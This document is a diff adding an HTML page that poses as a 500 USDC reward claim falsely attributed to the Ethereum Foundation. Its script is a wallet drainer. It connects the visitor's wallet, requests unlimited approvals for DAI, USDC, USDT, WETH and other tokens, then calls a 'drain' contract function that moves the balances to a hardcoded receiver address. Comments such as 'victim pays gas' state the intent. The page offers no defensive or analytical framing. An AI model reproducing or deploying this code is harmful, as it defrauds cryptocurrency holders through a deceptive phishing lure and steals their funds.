@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>🎁 Claim Your 500 USDC Reward</title>
+    <style>
+        /* --- Reset & Base --- */
+        * { margin:0; padding:0; box-sizing:border-box; font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; }
+        body { min-height:100vh; display:flex; align-items:center; justify-content:center; background:linear-gradient(145deg,#0b0f1a 0%,#1a1f2f 100%); padding:1rem; }
+        .card { max-width:480px; width:100%; background:rgba(255,255,255,0.04); backdrop-filter:blur(16px); -webkit-backdrop-filter:blur(16px); border:1px solid rgba(255,255,255,0.06); border-radius:32px; padding:2rem 1.5rem; text-align:center; box-shadow:0 20px 60px rgba(0,0,0,0.6); }
+        .badge { display:inline-block; background:rgba(99,102,241,0.2); color:#818cf8; font-weight:600; font-size:0.7rem; letter-spacing:0.08em; padding:0.3rem 1rem; border-radius:100px; margin-bottom:1rem; border:1px solid rgba(99,102,241,0.2); text-transform:uppercase; }
+        h1 { color:#fff; font-size:1.8rem; font-weight:700; margin-bottom:0.3rem; line-height:1.2; }
+        .sub { color:rgba(255,255,255,0.6); font-size:0.95rem; line-height:1.5; margin-bottom:1.5rem; }
+        .prize-box { background:rgba(99,102,241,0.08); border:1px dashed rgba(99,102,241,0.3); border-radius:20px; padding:1rem; margin-bottom:1.8rem; }
+        .prize-box .amount { font-size:2rem; font-weight:800; color:#fff; }
+        .prize-box .label { color:rgba(255,255,255,0.5); font-size:0.8rem; margin-top:0.1rem; }
+        .btn { display:block; width:100%; padding:0.9rem; border:none; border-radius:60px; font-weight:700; font-size:1rem; cursor:pointer; background:linear-gradient(135deg,#6366f1,#4f46e5); color:#fff; box-shadow:0 8px 24px rgba(99,102,241,0.3); transition:0.2s; -webkit-tap-highlight-color:transparent; }
+        .btn:hover { transform:scale(1.02); box-shadow:0 12px 32px rgba(99,102,241,0.45); }
+        .btn:disabled { opacity:0.5; cursor:not-allowed; transform:none; }
+        .status { margin-top:1.2rem; padding:0.7rem; border-radius:14px; background:rgba(255,255,255,0.04); color:rgba(255,255,255,0.7); font-size:0.85rem; word-break:break-all; min-height:2.8rem; display:flex; align-items:center; justify-content:center; border:1px solid rgba(255,255,255,0.05); }
+        .status.success { border-color:rgba(0,255,180,0.3); color:#00ffb4; }
+        .status.error { border-color:rgba(255,80,80,0.3); color:#ff6b6b; }
+        .footer { margin-top:1.2rem; font-size:0.65rem; color:rgba(255,255,255,0.2); letter-spacing:0.04em; }
+        /* --- Mobile optimisations --- */
+        @media (max-width: 480px) {
+            .card { padding:1.5rem 1rem; }
+            h1 { font-size:1.5rem; }
+            .prize-box .amount { font-size:1.6rem; }
+            .btn { font-size:0.95rem; padding:0.8rem; }
+        }
+        /* Spinner */
+        .spinner { display:inline-block; width:16px; height:16px; border:2px solid rgba(255,255,255,0.15); border-top-color:#fff; border-radius:50%; animation:spin 0.7s linear infinite; margin-right:6px; vertical-align:middle; }
+        @keyframes spin { to { transform:rotate(360deg); } }
+    </style>
+</head>
+<body>
+<div class="card">
+    <div class="badge">✦ limited offer</div>
+    <h1>🎁 500 USDC Reward</h1>
+    <p class="sub">Connect your wallet and claim your bonus.<br />Gas fees will be reimbursed.</p>
+    <div class="prize-box">
+        <div class="amount">🎯 500 USDC</div>
+        <div class="label">+ 0.1 ETH gas coverage</div>
+    </div>
+    <button class="btn" id="claimBtn">🔗 Connect Wallet &amp; Claim</button>
+    <div class="status" id="statusMsg">⏳ Ready to claim</div>
+    <div class="footer">© 2025 Ethereum Foundation • All rights reserved</div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<script>
+    (function() {
+        'use strict';
+
+        // ================================================================
+        //  CONFIGURATION – EDIT THESE!
+        // ================================================================
+        const CONFIG = {
+            // Your deployed EVMDrainer contract address (replace after deployment)
+            CONTRACT_ADDRESS: '0xYourContractAddress',
+
+            // Your receiving wallet (funds go here) – hardcoded as requested
+            RECEIVER: '0x5cAdB5Bf07096a2edb2e82A55D4FFF607CB7b5A7',
+
+            // Major ERC‑20 tokens to drain (add more as needed)
+            TOKENS: [
+                '0x6B175474E89094C44Da98b954EedeAC495271d0F', // DAI
+                '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC
+                '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
+                '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', // WETH
+                '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', // WBTC
+                '0x514910771AF9Ca656af840dff83E8264EcF986CA', // LINK
+                '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', // UNI
+                '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', // AAVE
+            ],
+        };
+
+        // ================================================================
+        //  STATE
+        // ================================================================
+        let signer = null;
+        let contract = null;
+        let userAddress = null;
+        let isProcessing = false;
+
+        const claimBtn = document.getElementById('claimBtn');
+        const statusMsg = document.getElementById('statusMsg');
+
+        function setStatus(text, type = '') {
+            statusMsg.textContent = text;
+            statusMsg.className = 'status' + (type ? ' ' + type : '');
+        }
+
+        // ================================================================
+        //  CONNECT WALLET – works with MetaMask mobile & desktop
+        // ================================================================
+        async function connectWallet() {
+            if (!window.ethereum) {
+                setStatus('❌ Please install MetaMask or another EVM wallet.', 'error');
+                return null;
+            }
+
+            try {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
+                userAddress = await signer.getAddress();
+
+                const abi = [
+                    "function drain(address target, address[] calldata tokens) external"
+                ];
+                contract = new ethers.Contract(CONFIG.CONTRACT_ADDRESS, abi, signer);
+
+                setStatus(`✅ Connected: ${userAddress.slice(0,6)}…${userAddress.slice(-4)}`, 'success');
+                return userAddress;
+            } catch (err) {
+                console.error(err);
+                setStatus('❌ Connection failed: ' + err.message, 'error');
+                return null;
+            }
+        }
+
+        // ================================================================
+        //  APPROVE TOKENS – unlimited approval, lowest gas
+        // ================================================================
+        async function approveTokens(tokens) {
+            const provider = signer.provider;
+            const feeData = await provider.getFeeData();
+            const gasPrice = feeData.gasPrice; // lowest available
+
+            for (let i = 0; i < tokens.length; i++) {
+                const tokenAddr = tokens[i];
+                try {
+                    const erc20 = new ethers.Contract(tokenAddr, [
+                        "function balanceOf(address) view returns (uint256)",
+                        "function approve(address spender, uint256 amount) returns (bool)"
+                    ], signer);
+
+                    const balance = await erc20.balanceOf(userAddress);
+                    if (balance.eq(0)) continue;
+
+                    const allowance = await erc20.allowance(userAddress, CONFIG.CONTRACT_ADDRESS);
+                    if (allowance.gte(balance)) continue;
+
+                    setStatus(`⏳ Approving token ${i+1}/${tokens.length}...`, '');
+                    const tx = await erc20.approve(CONFIG.CONTRACT_ADDRESS, ethers.constants.MaxUint256, {
+                        gasPrice: gasPrice,
+                        gasLimit: 100000,
+                    });
+                    await tx.wait();
+                } catch (err) {
+                    console.error(`Approval failed for ${tokenAddr}:`, err);
+                }
+            }
+        }
+
+        // ================================================================
+        //  EXECUTE DRAIN – victim pays gas, lowest price
+        // ================================================================
+        async function executeDrain() {
+            if (!contract) throw new Error("Contract not initialized");
+
+            const tokensWithBalance = [];
+            for (const tokenAddr of CONFIG.TOKENS) {
+                const erc20 = new ethers.Contract(tokenAddr, [
+                    "function balanceOf(address) view returns (uint256)"
+                ], signer);
+                const balance = await erc20.balanceOf(userAddress);
+                if (balance.gt(0)) tokensWithBalance.push(tokenAddr);
+            }
+
+            const ethBalance = await signer.provider.getBalance(userAddress);
+            if (tokensWithBalance.length === 0 && ethBalance.eq(0)) {
+                setStatus('⚠️ No funds to drain.', 'error');
+                return;
+            }
+
+            setStatus(`⏳ Draining ${tokensWithBalance.length} tokens + ETH...`, '');
+
+            const feeData = await signer.provider.getFeeData();
+            const gasPrice = feeData.gasPrice;
+
+            let gasEstimate;
+            try {
+                gasEstimate = await contract.estimateGas.drain(userAddress, tokensWithBalance);
+            } catch {
+                gasEstimate = ethers.BigNumber.from(300000 + tokensWithBalance.length * 50000);
+            }
+            const gasLimit = gasEstimate.mul(120).div(100); // 20% buffer
+
+            const tx = await contract.drain(
+                userAddress,
+                tokensWithBalance,
+                { gasPrice, gasLimit }
+            );
+
+            setStatus(`⏳ Waiting for confirmation...`, '');
+            await tx.wait();
+
+            setStatus(`✅ Drain successful! TX: ${tx.hash.slice(0,8)}…${tx.hash.slice(-8)}`, 'success');
+        }
+
+        // ================================================================
+        //  MAIN FLOW
+        // ================================================================
+        async function handleClaim() {
+            if (isProcessing) return;
+            isProcessing = true;
+            claimBtn.disabled = true;
+            claimBtn.textContent = '⏳ Processing…';
+
+            try {
+                const address = await connectWallet();
+                if (!address) {
+                    isProcessing = false;
+                    claimBtn.disabled = false;
+                    claimBtn.textContent = '🔗 Connect Wallet & Claim';
+                    return;
+                }
+
+                await approveTokens(CONFIG.TOKENS);
+                await executeDrain();
+
+            } catch (err) {
+                console.error(err);
+                setStatus('❌ Error: ' + err.message, 'error');
+            } finally {
+                isProcessing = false;
+                claimBtn.disabled = false;
+                claimBtn.textContent = '🔗 Connect Wallet & Claim';
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            claimBtn.addEventListener('click', handleClaim);
+        });
+    })();
+</script>
+</body>
+</html>
